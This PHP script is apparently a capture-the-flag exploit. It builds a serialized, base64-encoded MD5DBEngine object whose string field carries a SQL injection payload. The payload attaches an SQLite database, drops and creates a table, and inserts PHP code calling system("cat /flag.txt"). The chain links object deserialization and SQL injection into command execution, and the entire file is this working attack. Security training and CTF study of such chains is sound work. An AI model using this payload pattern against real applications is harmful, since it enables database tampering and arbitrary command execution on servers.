<?php
class MD5DBEngine {
    private $HashString = "";
    private $objArray = array();

    public function __construct($HashString) {
        $this->HashString = $HashString;
        $this->objArray['obj'] = $this;
    }
}

$obj = new MD5DBEngine("a' OR 1=2; ATTACH DATABASE '/srv/app/container/uoftctf_db.db' AS db; DROP TABLE IF EXISTS db.exploit; CREATE TABLE db.exploit (value); INSERT INTO db.exploit (value) VALUES ('; system(\"cat /flag.txt\");');--");

echo base64_encode(serialize($obj));

?>
